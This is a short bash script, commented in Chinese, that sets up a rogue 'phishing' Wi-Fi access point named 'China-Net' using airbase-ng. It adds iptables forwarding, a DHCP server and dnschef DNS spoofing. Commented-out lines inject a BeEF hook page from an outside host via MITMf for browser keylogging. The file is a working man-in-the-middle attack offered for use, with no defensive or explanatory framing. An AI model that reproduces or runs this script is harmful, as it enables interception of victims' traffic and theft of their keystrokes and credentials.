#！ /bin/bash
#建立钓鱼wifi，结合mitmf中间人攻击
iptables -F FORWARD &&
iptables -t nat -F &&
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
#iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356
iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu 
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000


sleep 3
ifconfig wlan1 down &&
iwconfig wlan1 mode monitor &&
ifconfig wlan1 up &&
airmon-ng start wlan1 &&

sleep 4
gnome-terminal -x bash -c "airbase-ng -e China-Net -c 11 wlan1"
sleep 6
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
#ifconfig at0 mtu 1500

sleep 4
echo 1 > /proc/sys/net/ipv4/ip_forward
service isc-dhcp-server stop
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0 &&
sleep 3
service isc-dhcp-server start &&
gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 114.114.114.114"
sleep 4
#beef-xss &&
#打开beef并进行80js键盘记录
#gnome-terminal -x bash -c "mitmf -i at0 --inject --html-url http://192.168.1.102:3000/demos/basic.html"
